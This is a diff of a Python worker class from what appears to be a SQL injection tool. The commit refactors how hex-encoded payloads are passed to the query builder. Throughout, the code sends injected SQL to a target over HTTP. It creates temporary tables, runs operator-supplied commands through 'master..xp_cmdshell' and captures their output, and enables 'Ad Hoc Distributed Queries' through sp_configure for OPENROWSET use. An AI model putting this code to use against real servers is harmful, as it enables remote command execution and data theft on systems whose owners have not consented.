@@ -220,18 +220,18 @@ class Worker(QtCore.QThread):
         if isCMD:
             createStr = createStr.replace("dtpropertie", "dtpropertiecmd")
             #delete table if exists
-            self.vars['hex'] = core.txtproc.strToHex("drop table dtpropertiecmd", True)
-            query = self.wq.buildQuery(self.qstring, self.vars)
+            hex = core.txtproc.strToHex("drop table dtpropertiecmd", True)
+            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
             #Creating table
-            self.vars['hex'] = core.txtproc.strToHex(createStr, True)
-            query = self.wq.buildQuery(self.qstring, self.vars)
+            hex = core.txtproc.strToHex(createStr, True)
+            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
             #Insert xp_cmdshell output to table
-            self.vars['hex'] = core.txtproc.strToHex("insert dtpropertiecmd exec master..xp_cmdshell '" + self.vars['command'] + "'", True)
-            query = self.wq.buildQuery(self.qstring, self.vars)
+            hex= core.txtproc.strToHex("insert dtpropertiecmd exec master..xp_cmdshell '" + self.vars['command'] + "'", True)
+            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
         else:
             return createStr
@@ -247,9 +247,9 @@ class Worker(QtCore.QThread):
         
     def enableOpenrowset(self):
         #Enbale openrowset request
-        self.vars['hex'] = core.txtproc.strToHex(\
+        hex = core.txtproc.strToHex(\
         "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure", True)
-        query = self.wq.buildQuery(self.qstring, self.vars)
+        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
     
     def opernrowsetWorker(self):
@@ -305,8 +305,8 @@ class Worker(QtCore.QThread):
             pass
         
         #Inserting data into sql server
-        self.vars['hex'] = core.txtproc.strToHex(openrowsetString, True)
-        query = self.wq.buildQuery(self.qstring, self.vars)
+        hex = core.txtproc.strToHex(openrowsetString, True)
+        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
 
         try:
@@ -325,8 +325,8 @@ class Worker(QtCore.QThread):
         
         #deleting xp_cmdshell temp table
         if self.vars['CMD']:
-            self.vars['hex'] = core.txtproc.strToHex("drop table dtpropertiecmd", True)
-            query = self.wq.buildQuery(self.qstring, self.vars)
+            hex = core.txtproc.strToHex("drop table dtpropertiecmd", True)
+            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
         #Deleting tamporaty table
